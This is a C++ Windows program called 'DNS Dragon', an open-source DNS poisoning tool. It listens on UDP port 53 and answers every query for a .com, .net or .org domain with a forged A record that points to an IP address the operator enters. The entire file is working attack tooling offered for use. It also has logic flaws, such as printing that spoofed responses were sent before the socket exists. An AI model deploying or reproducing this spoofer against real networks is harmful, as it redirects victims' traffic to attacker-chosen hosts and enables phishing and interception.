#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <ctime>
#include <thread> 

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

// Log file path
const string LOG_FILE_PATH = "dns_poisoning_log.txt";

// Function to log messages to a file
void logMessage(const string& message) {
    ofstream logFile(LOG_FILE_PATH, ios::app);
    if (logFile.is_open()) {
        time_t now;
        time(&now);
        char dt[26];
        ctime_s(dt, sizeof(dt), &now);
        logFile << "[" << dt << "] " << message << endl;
        logFile.close();
    }
}

// Function to handle DNS poisoning for websites
void dns_poison(SOCKET recvSocket, sockaddr_in& clientAddr, char* recvBuf, int recvBufLen, const string& spoofedIP, const string& logFilePath) {
    // Extract the DNS query
    char* queryName = recvBuf + 12; // Skip DNS header

    // Log the DNS query
    ofstream logFile(logFilePath, ios::app);
    if (logFile.is_open()) {
        time_t now;
        time(&now);
        char dt[26];
        ctime_s(dt, sizeof(dt), &now);
        logFile << "[" << dt << "] Received DNS query for: " << queryName << endl;
        logFile.close();
    }

    // Check if the query is for a website
    string query(queryName);
    if (query.find(".com") != string::npos || query.find(".net") != string::npos || query.find(".org") != string::npos) {
        // Construct a spoofed DNS response
        char sendBuf[512];
        memset(sendBuf, 0, sizeof(sendBuf));

        // Copy DNS ID from request
        memcpy(sendBuf, recvBuf, 2);

        // Set response flags
        sendBuf[2] = 0x81; // Response, recursion available
        sendBuf[3] = 0x80; // No error

        // Set question count
        memcpy(sendBuf + 4, recvBuf + 4, 2);

        // Set answer count
        sendBuf[6] = 0x00;
        sendBuf[7] = 0x01;

        // Copy original query
        memcpy(sendBuf + 12, recvBuf + 12, recvBufLen - 12);

        // Set answer section
        int queryLen = strlen(queryName) + 1;
        int offset = 12 + queryLen + 4; // 4 bytes after the query name (type and class)

        // Name
        sendBuf[offset] = 0xc0; // Pointer to the query name
        sendBuf[offset + 1] = 0x0c;

        // Type (A record)
        sendBuf[offset + 2] = 0x00;
        sendBuf[offset + 3] = 0x01;

        // Class (IN)
        sendBuf[offset + 4] = 0x00;
        sendBuf[offset + 5] = 0x01;

        // TTL
        sendBuf[offset + 6] = 0x00;
        sendBuf[offset + 7] = 0x00;
        sendBuf[offset + 8] = 0x00;
        sendBuf[offset + 9] = 0x10; // 16 seconds

        // Data length
        sendBuf[offset + 10] = 0x00;
        sendBuf[offset + 11] = 0x04;

        // IP Address (spoofed address)
        inet_pton(AF_INET, spoofedIP.c_str(), sendBuf + offset + 12);

        // Send the spoofed response
        int sendBufLen = offset + 16;
        if (sendto(recvSocket, sendBuf, sendBufLen, 0, (SOCKADDR*)&clientAddr, sizeof(clientAddr)) == SOCKET_ERROR) {
            // Log the error
            ofstream logFile(logFilePath, ios::app);
            if (logFile.is_open()) {
                logFile << "sendto failed: " << WSAGetLastError() << endl;
                logFile.close();
            }
        }
        else {
            // Log the spoofed DNS response
            ofstream logFile(logFilePath, ios::app);
            if (logFile.is_open()) {
                logFile << "Sent spoofed DNS response for: " << queryName << " to IP: " << spoofedIP << endl;
                logFile.close();
            }
        }
    }
}

// Function to listen for DNS queries
void listenForQueries(SOCKET recvSocket, const string& spoofedIP, const string& logFilePath) {
    sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    char recvBuf[512];
    int recvBufLen = sizeof(recvBuf);

    while (true) {
        int bytesReceived = recvfrom(recvSocket, recvBuf, recvBufLen, 0, (SOCKADDR*)&clientAddr, &clientAddrLen);
        if (bytesReceived == SOCKET_ERROR) {
            // Log the error
            ofstream logFile(logFilePath, ios::app);
            if (logFile.is_open()) {
                logFile << "recvfrom failed: " << WSAGetLastError() << endl;
                logFile.close();
            }
            continue;
        }

        // Process the DNS query and send a spoofed response for websites
        dns_poison(recvSocket, clientAddr, recvBuf, bytesReceived, spoofedIP, logFilePath);
    }
}

int main() {
    WSADATA wsaData;
    SOCKET recvSocket = INVALID_SOCKET;
    sockaddr_in recvAddr;
    int port = 53;
    string spoofedIP, logFilePath;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed: " << WSAGetLastError() << endl;
        return 1;
    }

    // Print developer information
    cout << "----------------------------------------------------------------------------------" << endl;
    cout << "      DNS Dragon, An open source DNS Poisening tool, Developed By Deccatron" << endl;
    cout << "----------------------------------------------------------------------------------" << endl;

    cout << " " << endl;

    // Get the log file path from the user
    cout << "Enter file path for logging: ";
    getline(cin, logFilePath);

    cout << " " << endl;

    // Get the spoofed IP address from the user
    cout << "Enter the IP address to spoof: ";
    cin >> spoofedIP;

    cout << " " << endl;

    // Log the spoofed DNS response
    cout << "--------------------------------------------------" << endl;
    cout << "Spoofed DNS response sent " << "to IP " << spoofedIP << endl;
    cout << "--------------------------------------------------" << endl;

    cout << " " << endl;

    // Prompt to wait for user input before exiting
    cout << "Press Enter to exit program and stop spoofing...";
    cin.ignore();
    cin.get(); // Wait for user input

    // Create a socket for receiving data
    recvSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (recvSocket == INVALID_SOCKET) {
        cout << "socket failed: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    // Set up the RecvAddr structure with the server's IP address and port
    recvAddr.sin_family = AF_INET;
    recvAddr.sin_port = htons(port);
    recvAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind the socket
    if (bind(recvSocket, (SOCKADDR*)&recvAddr, sizeof(recvAddr)) == SOCKET_ERROR) {
        cout << "bind failed: " << WSAGetLastError() << endl;
        closesocket(recvSocket);
        WSACleanup();
        return 1;
    }

    // Print developer information
    cout << "-------------------------------------" << endl;
    cout << "      Developed By: Deccatron" << endl;
    cout << "-------------------------------------" << endl;

    cout << "DNS Poisoning server running on port " << port << endl;
    logMessage("DNS Poisoning server running on port " + to_string(port) + " with log file: " + logFilePath);

    // Start listening for DNS queries in a separate thread
    thread queryListener(listenForQueries, recvSocket, spoofedIP, logFilePath);

    // Main thread waits for user input
    cout << "Press Enter to exit...";
    cin.ignore();
    cin.get(); // Wait for user input

    // Cleanup
    closesocket(recvSocket);
    WSACleanup();

    // Join the query listener thread
    queryListener.join();

    return 0;
}